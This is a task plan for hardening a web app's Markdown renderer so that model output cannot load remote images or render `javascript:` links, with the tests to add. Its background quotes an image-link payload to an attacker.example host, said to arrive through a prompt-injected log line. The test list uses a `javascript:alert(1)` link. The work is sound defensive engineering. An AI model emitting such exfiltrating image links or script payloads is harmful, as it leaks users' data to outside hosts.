# 37 · Security: Markdown from the model or notes never loads remote images

## Background (verified on `main`)

- `web/src/components/Markdown.tsx` renders triage reports, chat answers and notes with
  `react-markdown`, `skipHtml`, and a custom `a` (new tab, `noreferrer noopener`). It
  has no `img` override, so `![](https://attacker.example/?d=...)` in model output (for
  example from a prompt-injected log line) becomes an `<img>`.
- The hub's CSP has `img-src 'self' data:` (`crates/domovoi-hub/src/middleware.rs`), so
  browsers should block the request today. That is one control with no test; the
  component should not depend on it.
- `web/src/components/components.test.tsx:36` tests that raw HTML is not rendered. No
  test covers images or `javascript:` links.

## Steps

1. In `Markdown.tsx`, add an `img` component that renders the alt text as plain text
   with a link next to it (`[image: alt](url)`, using the same safe `a`), never an
   `<img>`. Only `http:` and `https:` URLs become links; anything else is plain text.
2. Make the `a` component refuse non-`http(s)`/`mailto:` hrefs explicitly (render the
   children as text), instead of relying on react-markdown's default `urlTransform`.
3. Update the component's doc comment to say both.

## Tests (`web/src/components/components.test.tsx`)

- `markdown_never_renders_an_image`: no `img` element for `![x](https://e.example/a.png)`;
  the alt text and a link are shown.
- `markdown_drops_javascript_links`: `[x](javascript:alert(1))` renders no `a` element.
- `markdown_keeps_https_links_in_a_new_tab`.

## Done when

- No Markdown on any page can make the browser fetch a URL the model chose without a
  click.
